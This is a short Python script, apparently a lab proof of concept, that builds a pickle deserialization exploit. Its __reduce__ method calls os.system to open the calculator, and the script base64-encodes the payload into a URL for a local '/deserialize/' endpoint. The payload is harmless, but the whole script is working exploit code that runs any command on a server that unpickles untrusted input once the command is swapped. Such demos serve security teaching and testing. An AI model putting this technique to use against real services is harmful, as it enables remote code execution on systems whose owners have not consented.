import pickle
import base64
import os
#deserialize_data function vulnerable that opens the calculator
class Exploit:
    def __reduce__(self):
        return (os.system, ("calc",))  # Opens Calculator (Windows). Replace with "gnome-calculator" for Linux.

# Serialize payload
payload = pickle.dumps(Exploit())
encoded_payload = base64.b64encode(payload).decode()

print("Use this payload in your URL:")
print(f"http://127.0.0.1:8000/deserialize/?data={encoded_payload}")
